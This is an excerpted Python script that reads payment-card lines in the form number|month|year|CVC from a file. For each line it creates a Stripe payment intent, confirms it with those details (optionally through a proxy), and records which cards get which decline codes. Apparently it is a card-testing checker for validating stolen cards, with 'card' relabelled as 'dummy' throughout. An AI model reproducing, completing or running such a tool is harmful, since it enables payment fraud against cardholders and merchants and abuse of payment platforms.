...
def confirm_stripe_payment(payment_intent_id, client_secret, dummy_number, dummy_exp_month, dummy_exp_year, dummy_cvc, proxy=None):
    ...
    payload = {
        ...
        'payment_method_data[type]': 'dummy', 'payment_method_data[dummy][number]': dummy_number,
        'payment_method_data[dummy][cvc]': dummy_cvc, 'payment_method_data[dummy][exp_year]': dummy_exp_year,
        'payment_method_data[dummy][exp_month]': dummy_exp_month, 'payment_method_data[allow_redisplay]': 'unspecified',
        ...
        'expected_payment_method_type': 'dummy', 'use_stripe_sdk': 'true', 'key': STRIPE_KEY, 'client_secret': client_secret
    }
    ...
    try:
        ...
        if decline_code in saveable_decline_codes:
            ...
            return False, response_data, "dummy Declined"
...
if __name__ == "__main__":
    ...
    # --- CHANGE 2: The main loop now gets a new token/uid for each dummy ---
    with open(INPUT_FILE, 'r') as f_in, open(OUTPUT_FILE, 'a') as f_out:
        for line in f_in:
            ...
            if not payment_intent_id or not client_secret:
                print("Failed to extract intent details, skipping dummy.")
                continue

            try:
                dummy_number, exp_month, exp_year, cvc = line.split('|')
                print(f"dummy: {dummy_number} | Intent: {payment_intent_id}")
                
                should_save, response_data, reason = confirm_stripe_payment(
                    payment_intent_id, client_secret, dummy_number, exp_month, exp_year, cvc
                )
                ...
                print(f"Could not parse dummy line: {line}")
                pass
